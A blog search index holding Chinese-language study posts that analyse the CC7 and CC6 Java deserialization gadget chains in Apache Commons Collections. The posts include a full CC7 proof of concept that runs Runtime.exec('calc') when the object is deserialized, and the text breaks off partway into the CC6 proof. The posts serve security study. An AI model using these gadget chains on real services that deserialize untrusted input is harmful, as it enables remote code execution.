<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CC7</title>
      <link href="/2024/06/24/CC7/"/>
      <url>/2024/06/24/CC7/</url>
      
        <content type="html"><![CDATA[<h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="CC7分析"><a href="#CC7分析" class="headerlink" title="CC7分析"></a>CC7分析</h2><p>yso中找了另一条链来调LazyMap.get()，也就是入口类变了</p><p><img src="/2024/06/24/CC7/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240621135950725.png" alt="image-20240621135950725"></p><h3 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> <span class="keyword">equals</span>(Object o) &#123;</span><br><span class="line"><span class="params">...</span></span><br><span class="line">                <span class="keyword">if</span> (value == <span class="built_in">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.get(key)==<span class="built_in">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"><span class="params">...</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>调用了m.get()可以将m值赋为LazyMap来触发LazyMap.get()</p><h3 id="AbstractMapDecorator-equals"><a href="#AbstractMapDecorator-equals" class="headerlink" title="AbstractMapDecorator.equals()"></a>AbstractMapDecorator.equals()</h3><figure class="highlight typescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">boolean</span> <span class="title function_">equals</span>(<span class="params"><span class="built_in">Object</span> <span class="built_in">object</span></span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">object</span> == <span class="variable language_">this</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map.<span class="title function_">equals</span>(<span class="built_in">object</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了equals()，可以用来触发AbstarctMap.equals</p><h3 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h3><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">void</span> reconstitutionPut(Entry&lt;?,?&gt;[] <span class="literal">tab</span>, K key, V value)</span><br><span class="line">    throws StreamCorruptedException</span><br><span class="line">&#123;...</span><br><span class="line">    <span class="keyword">for</span> (Entry&lt;?,?&gt; e = <span class="literal">tab</span>[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">        <span class="keyword">if</span> ((e.<span class="built_in">hash</span> == <span class="built_in">hash</span>) &amp;&amp; e.key.<span class="built_in">equals</span>(key)) &#123;   <span class="comment">//调用了equals</span></span><br><span class="line">            throw <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了equals()</p><h3 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h3><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">private void <span class="built_in">readObject</span>(java.io.ObjectInputStream s)</span><br><span class="line">     throws IOException, ClassNotFoundException</span><br><span class="line">&#123;</span><br><span class="line">    ...</span><br><span class="line">    for (; elements &gt; <span class="number">0</span>; elements--) &#123;</span><br><span class="line">        <span class="keyword">@SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">            K key = (K)s.readObject();</span><br><span class="line">        <span class="keyword">@SuppressWarnings</span>(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">            V value = (V)s.readObject();</span><br><span class="line">        <span class="comment">// synch could be eliminated for performance</span></span><br><span class="line">        <span class="built_in">reconstitutionPut</span>(table, key, value);  <span class="comment">//调用了reconstitutionPut</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用了reconstitutionPut()</p><h2 id="CC7构造"><a href="#CC7构造" class="headerlink" title="CC7构造"></a>CC7构造</h2><p>先看AbstractMap.equals()</p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> boolean equals(Object o) &#123;</span><br><span class="line"><span class="comment">//判断是否为同一对象</span></span><br><span class="line">        <span class="keyword">if</span> (o == <span class="keyword">this</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="comment">//判断是否为Map实例</span></span><br><span class="line">        <span class="keyword">if</span> (!(o instanceof Map))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="comment">//强制转换为Map型</span></span><br><span class="line">        Map&lt;?,?&gt; m = (Map&lt;?,?&gt;) o;</span><br><span class="line">        <span class="comment">//判断键值对数量是否相同</span></span><br><span class="line">        <span class="keyword">if</span> (m.size() != size())</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Iterator&lt;Entry&lt;K,V&gt;&gt; i = entrySet().iterator();</span><br><span class="line">            <span class="keyword">while</span> (i.hasNext()) &#123;</span><br><span class="line">                Entry&lt;K,V&gt; e = i.next();</span><br><span class="line">                <span class="comment">//获取键值对</span></span><br><span class="line">                K key = e.getKey();</span><br><span class="line">                V value = e.getValue();</span><br><span class="line">                <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!(m.<span class="keyword">get</span>(key)==<span class="literal">null</span> &amp;&amp; m.containsKey(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!value.equals(m.<span class="keyword">get</span>(key)))</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ClassCastException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (NullPointerException unused) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>简单来说以上代码就是判断两个Map对象中的键值对是否相同，比较过程中调用了m.get()，m赋值为LazyMap即可</p><p>然后来看看Hashtable.reconstitutionPut()</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">private <span class="keyword">void</span> reconstitutionPut(Entry&lt;?,?&gt;[] <span class="literal">tab</span>, K key, V value)</span><br><span class="line">        throws StreamCorruptedException</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">            throw <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">        &#125;</span><br><span class="line"><span class="comment">//计算key的哈希值</span></span><br><span class="line">        int <span class="built_in">hash</span> = key.hashCode();</span><br><span class="line">        int index = (<span class="built_in">hash</span> &amp; <span class="number">0x7FFFFFFF</span>) % <span class="literal">tab</span>.<span class="built_in">length</span>;</span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;?,?&gt; e = <span class="literal">tab</span>[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;<span class="comment">//判断key是否重复</span></span><br><span class="line">            <span class="keyword">if</span> ((e.<span class="built_in">hash</span> == <span class="built_in">hash</span>) &amp;&amp; e.key.<span class="built_in">equals</span>(key)) &#123;</span><br><span class="line">                throw <span class="keyword">new</span> java.io.StreamCorruptedException();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        @SuppressWarnings(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">            Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)<span class="literal">tab</span>[index];</span><br><span class="line">        <span class="literal">tab</span>[index] = <span class="keyword">new</span> Entry&lt;&gt;(<span class="built_in">hash</span>, key, value, e);</span><br><span class="line">        <span class="built_in">count</span>++;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>以上代码就是判断key和hash值是否重复，如果没有，就将新的条目插入哈希表中</p><p>其中<code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code>存在一个Java布尔值短路特性，必须要满足<code>(e.hash == hash)</code>才能执行<code>e.key.equals(key)</code>从而调用equals()，所以我们必须向Hashtable加两个hash值相同但却自身却不同的元素，给出两组hash值相同的（详细过程见：<a href="https://blog.csdn.net/qq_35733751/article/details/119862728%EF%BC%89%EF%BC%9A">https://blog.csdn.net/qq_35733751/article/details/119862728）：</a></p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">yy与zZ</span><br><span class="line">Ea与FB</span><br></pre></td></tr></table></figure><p>这样赋值</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">HashMap hashMap1 =<span class="built_in"> new </span>HashMap();</span><br><span class="line">HashMap hashMap2 =<span class="built_in"> new </span>HashMap();</span><br><span class="line"></span><br><span class="line">Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">LazyMap1.put(<span class="string">&quot;yy&quot;</span>,1);</span><br><span class="line">Map LazyMap2 = LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">LazyMap2.put(<span class="string">&quot;zZ&quot;</span>,1);</span><br><span class="line"></span><br><span class="line">Hashtable hashtable =<span class="built_in"> new </span>Hashtable();</span><br><span class="line">hashtable.put(<span class="class">LazyMap1,1);</span></span><br><span class="line">hashtable.put(<span class="class">LazyMap2,1);</span></span><br></pre></td></tr></table></figure><p>但Hashtable在添加第二个元素时，lazyMap2集合会“莫名其妙”添加一个元素（yy&#x3D;yy），这是因为在Hashtable调用put方法时，其内部也会调用equals方法根据元素的key判断是否为同一元素</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">public synchronized V put(K key, V value) &#123;</span><br><span class="line"><span class="comment">//value是否为null</span></span><br><span class="line">       <span class="keyword">if</span> (value == <span class="literal">null</span>) &#123;</span><br><span class="line">           throw <span class="keyword">new</span> NullPointerException();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//临时变量</span></span><br><span class="line">       Entry&lt;?,?&gt; <span class="literal">tab</span>[] = table;</span><br><span class="line"><span class="comment">//计算元素的存储索引</span></span><br><span class="line">       int <span class="built_in">hash</span> = key.hashCode();</span><br><span class="line">       int index = (<span class="built_in">hash</span> &amp; <span class="number">0x7FFFFFFF</span>) % <span class="literal">tab</span>.<span class="built_in">length</span>;</span><br><span class="line"><span class="comment">//获取指定索引的链表</span></span><br><span class="line">       @SuppressWarnings(<span class="string">&quot;unchecked&quot;</span>)</span><br><span class="line">       Entry&lt;K,V&gt; entry = (Entry&lt;K,V&gt;)<span class="literal">tab</span>[index];</span><br><span class="line"><span class="comment">//遍历链表的节点（元素）</span></span><br><span class="line">       <span class="keyword">for</span>(; entry != <span class="literal">null</span> ; entry = entry.next) &#123;</span><br><span class="line"><span class="comment">//判断key是否重复</span></span><br><span class="line">           <span class="keyword">if</span> ((entry.<span class="built_in">hash</span> == <span class="built_in">hash</span>) &amp;&amp; entry.key.<span class="built_in">equals</span>(key)) &#123;</span><br><span class="line"><span class="comment">//覆盖value</span></span><br><span class="line">               V old = entry.value;</span><br><span class="line">               entry.value = value;</span><br><span class="line">               <span class="keyword">return</span> old;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line"><span class="comment">//key不重复则添加元素</span></span><br><span class="line">       addEntry(<span class="built_in">hash</span>, key, value, index);</span><br><span class="line">       <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>此时的key是lazyMap2对象，而lazyMap2实际上调用了AbstractMap抽象类的equals方法，equals方法内部会调用lazyMap2的get方法判断table数组中元素的key在lazyMap2是否已存在，如果不存在，transform会把当前传入的key返回作为value，然后lazyMap2会调用put方法把key和value（yy&#x3D;yy）添加到lazyMap2</p><p>而在反序列化时，reconstitutionPut方法在还原table数组时会调用equals方法判断重复元素，由于AbstractMap抽象类的equals方法校验的时候更为严格，会判断Map中元素的个数，由于lazyMap2和lazyMap1中的元素个数不一样则直接返回false，所以还需要<code>remove(&quot;yy&quot;)</code>，将元素yy删除</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Target;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Proxy;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Hashtable;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CC7test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="literal">null</span>,<span class="literal">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,<span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">ChainedTransformer</span> <span class="variable">chainedTransformer</span> <span class="operator">=</span>  <span class="keyword">new</span> <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line">        Map LazyMap1=LazyMap.decorate(hashMap1,chainedTransformer);</span><br><span class="line">        LazyMap1.put(<span class="string">&quot;yy&quot;</span>,<span class="number">1</span>);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">LazyMap2</span> <span class="operator">=</span> LazyMap.decorate(hashMap2, chainedTransformer);</span><br><span class="line">        LazyMap2.put(<span class="string">&quot;zZ&quot;</span>,<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">        hashtable.put(LazyMap1,<span class="number">1</span>);</span><br><span class="line">        hashtable.put(LazyMap2,<span class="number">1</span>);</span><br><span class="line">        LazyMap2.remove(<span class="string">&quot;yy&quot;</span>);</span><br><span class="line"></span><br><span class="line">        serialize(hashtable);  <span class="comment">//序列化</span></span><br><span class="line">        unserialize(<span class="string">&quot;ser.bin&quot;</span>); <span class="comment">//反序列化</span></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span> <span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">unserialize</span> <span class="params">(String s)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>调用链：</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Hashtable.readObject</span><br><span class="line">  -&gt;Hashtable.reconstitutionPut</span><br><span class="line">-&gt;AbstractMapDecorator.equals</span><br><span class="line">  -&gt;AbstractMap.equals</span><br><span class="line">-&gt;ChainedTransformer.transform</span><br><span class="line">          -&gt;...</span><br></pre></td></tr></table></figure><p>参考：</p><p><a href="https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/">https://infernity.top/2024/04/18/JAVA%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-CC7%E9%93%BE/</a></p><p><a href="https://blog.csdn.net/qq_35733751/article/details/119862728">https://blog.csdn.net/qq_35733751/article/details/119862728</a></p>]]></content>
      
      
      <categories>
          
          <category> Java安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CC6</title>
      <link href="/2024/06/24/CC6/"/>
      <url>/2024/06/24/CC6/</url>
      
        <content type="html"><![CDATA[<h1 id="CC6"><a href="#CC6" class="headerlink" title="CC6"></a>CC6</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最好用的CC链，因为CC6不受jdk版本限制，CC6这条链子就像CC1-LazyMap和URLDNS链子的结合版</p><p>CC1学完后我们发现在jdk 8u71之后就重写了AnnotationInvocationHandler类，导致我们不能通过AnnotationInvocationHandler类来调用LazyMap.get()，那么是否有一种方法能无视jdk版本调用LazyMap.get()从而实现ChaindeTransformer.transform()的链式调用呢？</p><p>我们知道URLDNS链是无视jdk版本的，URLDNS链通过HashMap.readObject中的put调用hashcode，如果能找到某个hashcode中调用了LazyMap.get()，就实现了无视jdk版本实现ChaindeTransformer.transform()的链式调用</p><h2 id="CC6分析构造"><a href="#CC6分析构造" class="headerlink" title="CC6分析构造"></a>CC6分析构造</h2><p>可以看到yso的CC6是通过TiedMapEntry.getValue()来调用LazyMap.get()的</p><p><img src="/2024/06/24/CC6/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240612140946052.png" alt="image-20240612140946052"></p><p>可以看到TiedMapEntry.getValue()中调用了map.get()</p><p>![屏幕截图 2024-06-12 141210](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-12 141210.png)</p><p>这里map和key值都可控，再跟进一下看哪里调用了getValue()，其自身的hashCode就调用了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">hashCode</span>()</span> &#123;</span><br><span class="line">    Object <span class="keyword">value</span> = getValue();</span><br><span class="line">    <span class="keyword">return</span> (getKey() == <span class="literal">null</span> ? <span class="number">0</span> : getKey().hashCode()) ^</span><br><span class="line">           (<span class="keyword">value</span> == <span class="literal">null</span> ? <span class="number">0</span> : <span class="keyword">value</span>.hashCode()); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再看TiedMapEntry类的构造函数</p><p><img src="/2024/06/24/CC6/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240612141344815.png" alt="image-20240612141344815"></p><p>我们将map值设为LazyMap对象，key值任意，就可以调用LazyMap.get()</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">TiedMapEntry tiedMapEntry</span> = new TiedMapEntry(lazymap,<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure><p>学过URLDNS链我们知道，HashMap中是key值调用hashCode，所以这里我们将HashMap中控制key值设为tiedMapEntry，value随便传</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">HashMap&lt;Object,Object&gt; map2= <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry,<span class="string">&quot;value&quot;</span>);</span><br></pre></td></tr></table></figure><p>这里我们发现不进行序列化和反序列化操作也会弹出计算器</p><p><img src="/2024/06/24/CC6/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240612143754927.png" alt="image-20240612143754927"></p><p>因为在URLDNS链中HashMap的put方法也可以调用hashcode方法</p><p>![屏幕截图 2024-06-12 144030](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-12 144030.png)</p><p>![屏幕截图 2024-06-12 144126](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-12 144126.png)</p><p>我们可以先随便传个<code>new ConstantTransformer(1)</code>代替<code>chainedTransformer</code>，先让put时不触发，put后再传回<code>chainedTransformer</code>，LazyMap构造器中第二个参数名为factory</p><p><img src="/2024/06/24/CC6/Users\28698\AppData\Roaming\Typora\typora-user-images\image-20240612150619121.png" alt="image-20240612150619121"></p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Class</span> c = LazyMap.<span class="keyword">class</span><span class="comment">;</span></span><br><span class="line">Field factoryField = c.getDeclaredField(<span class="string">&quot;factory&quot;</span>)<span class="comment">;</span></span><br><span class="line">factoryField.setAccessible(true)<span class="comment">;</span></span><br><span class="line"><span class="comment">//修改lazymap中factory字段的值为chainedTransformer</span></span><br><span class="line">factoryField.<span class="keyword">set</span>(lazymap,chainedTransformer)<span class="comment">;</span></span><br></pre></td></tr></table></figure><p>还是无法弹出计算器，因为LazyMap.get()中想要实现<code>ChainedTransformer.transform()</code>就必须保证LazyMap的Key为空</p><p>![屏幕截图 2024-06-12 151431](C:\Users\28698\Pictures\Screenshots\屏幕截图 2024-06-12 151431.png)</p><p>而在put后是返回了key值的，也就是我们传new ConstantTransformer(1)后生成的tiedMapEntry的key值，解决很简单，在put后将这个key值删除即可</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lazymap.<span class="built_in">remove</span>(<span class="string">&quot;key&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>完整poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span 